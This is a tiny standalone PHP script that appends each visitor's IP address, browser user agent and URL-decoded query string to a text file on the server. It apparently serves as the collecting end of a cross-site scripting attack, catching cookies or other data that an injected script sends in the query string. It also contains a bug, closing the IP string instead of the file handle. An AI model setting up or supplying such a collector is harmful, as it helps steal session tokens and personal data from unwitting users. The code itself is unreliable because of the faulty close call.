<?php

    $ip=$_SERVER['REMOTE_ADDR'];$browser=$_SERVER['HTTP_USER_AGENT'];

    $fp=fopen('txtstorefileonourserver.txt','a');

    fwrite($fp,$ip.''.$browser." \n");fwrite($fp,urldecode($_SERVER['QUERY_STRING']. " \n\n"));fclose($ip);?>
